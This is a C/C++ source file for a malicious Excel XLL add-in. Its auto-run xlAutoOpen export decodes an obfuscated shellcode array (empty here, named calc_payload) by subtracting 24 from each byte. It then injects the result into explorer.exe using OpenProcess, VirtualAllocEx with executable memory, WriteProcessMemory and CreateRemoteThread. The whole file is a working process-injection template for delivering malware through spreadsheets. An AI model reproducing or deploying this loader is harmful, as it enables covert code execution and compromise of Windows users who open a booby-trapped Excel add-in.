#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>

DWORD GetProcessIdByName(const char * processName) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_stricmp(entry.szExeFile, processName) == 0)
			{
				CloseHandle(snapshot);
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);
	return 0;
} 

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" void __declspec(dllexport) xlAutoOpen(); void xlAutoOpen() {

    const char calc_payload[] = { };
	unsigned int calc_len = sizeof(calc_payload);

    DWORD pid = GetProcessIdByName("explorer.exe");

	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * calc_len * 2);
	memcpy(encoded, calc_payload, calc_len);

	unsigned char* decoded = encoded;

	for (int i = 0; i < sizeof calc_payload; i++) {
			unsigned int ia = (unsigned int)decoded[i] - 24;
			decoded[i] = (byte)(ia & 0xFF);
	}

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, calc_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, decoded, calc_len, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
}